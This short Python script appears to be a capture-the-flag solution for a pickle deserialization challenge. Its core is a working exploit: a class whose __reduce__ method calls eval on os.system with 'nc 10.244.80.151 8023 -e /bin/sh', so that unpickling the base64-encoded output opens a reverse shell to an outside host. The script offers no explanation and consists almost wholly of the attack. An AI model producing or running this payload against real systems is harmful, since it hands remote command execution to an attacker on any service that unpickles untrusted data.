import pickle

a = 'abcd'

print(pickle.dumps(a))

a = '123'

# python2 dumps
python2_dumps = '''S'abcd'
p0
.'''

# print(pickle.loads(python2_dumps))


# Solve1

import pickle
import base64
import os

class A(object):
    def __reduce__(self):
        return (eval, ("__import__('os').system('nc 10.244.80.151 8023 -e /bin/sh')",))

a = A()
print(base64.b64encode(pickle.dumps(a)))

# res = pickle.loads(base64.b64decode('gAN9cQAoWAUAAABtb25leXEBTfQBWAcAAABoaXN0b3J5cQJdcQNYEAAAAGFudGlfdGFtcGVyX2htYWNxBFggAAAAYWExYmE0ZGU1NTA0OGNmMjBlMGE3YTYzYjdmOGViNjJxBXUu'))

# print(res)